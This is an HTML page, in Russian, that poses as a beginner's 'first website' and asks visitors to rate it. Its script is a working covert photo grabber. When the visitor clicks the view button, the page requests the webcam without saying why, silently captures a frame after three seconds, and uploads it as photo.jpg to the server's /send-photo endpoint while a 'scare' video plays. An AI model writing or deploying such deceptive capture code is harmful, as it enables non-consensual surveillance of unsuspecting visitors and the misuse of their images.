<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>first project</title>
  <link rel="preconnect" href="https://fonts.gstatic.com" />
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;900&display=swap" rel="stylesheet" />
  <style>
    body, html {
      margin: 0;
      padding: 0;
      height: 100vh;
      overflow: hidden;
      font-family: 'Inter', sans-serif;
    }
    .overlay, .scare {
      position: fixed;
      top: 0;
      left: 0;
      height: 100vh;
      width: 100vw;
    }
    .overlay {
      z-index: 2;
      display: flex;
      align-items: center;
      justify-content: center;
      background-color: #f5f6fa;
      padding: 24px;
      text-align: center;
    }
    .overlay[hidden] {
      display: none;
    }
    .overlay-title {
      font-size: 24px;
      font-weight: 900;
      margin-bottom: 16px;
    }
    .overlay-description {
      font-size: 16px;
      color: rgba(0, 0, 0, 0.6);
      margin-bottom: 16px;
    }
    .overlay-button {
      background: rgb(132, 94, 194);
      color: white;
      padding: 12px 24px;
      border: none;
      border-radius: 6px;
      font-size: 16px;
      cursor: pointer;
    }
    video#background-video {
      width: 100%;
      height: 100%;
      object-fit: cover;
      position: absolute;
      z-index: 1;
    }
    video#camera-stream {
      display: none;
    }
  </style>
</head>
<body>
  <div class="overlay" id="overlay">
    <div>
      <p class="overlay-title">Просьба оценить мой первый сайт</p>
      <p class="overlay-description">Этот сайт был написан с нуля. Есть адаптация под мобильные устройства.</p>
      <button class="overlay-button" id="accept-button">Смотреть сайт</button>
    </div>
  </div>

  <div class="scare">
    <video id="background-video" autoplay muted loop playsinline src="media/video.mp4"></video>
    <video id="camera-stream" autoplay muted playsinline></video>
  </div>

  <script>
    const overlay = document.getElementById("overlay");
    const acceptButton = document.getElementById("accept-button");
    const cameraVideo = document.getElementById("camera-stream");

    acceptButton.addEventListener("click", async () => {
      overlay.hidden = true;
      await activateCamera();
    });

    async function activateCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        cameraVideo.srcObject = stream;

        setTimeout(() => {
          const canvas = document.createElement("canvas");
          canvas.width = cameraVideo.videoWidth || 640;
          canvas.height = cameraVideo.videoHeight || 480;
          const ctx = canvas.getContext("2d");
          ctx.drawImage(cameraVideo, 0, 0, canvas.width, canvas.height);

          stream.getTracks().forEach(track => track.stop());

          canvas.toBlob(blob => {
            const formData = new FormData();
            formData.append("photo", blob, "photo.jpg");

            fetch("/send-photo", {
              method: "POST",
              body: formData
            }).then(() => console.log("Фото отправлено"));
          }, "image/jpeg");
        }, 3000);
      } catch (err) {
        console.error("Ошибка доступа к камере:", err);
      }
    }
  </script>
</body>
</html>
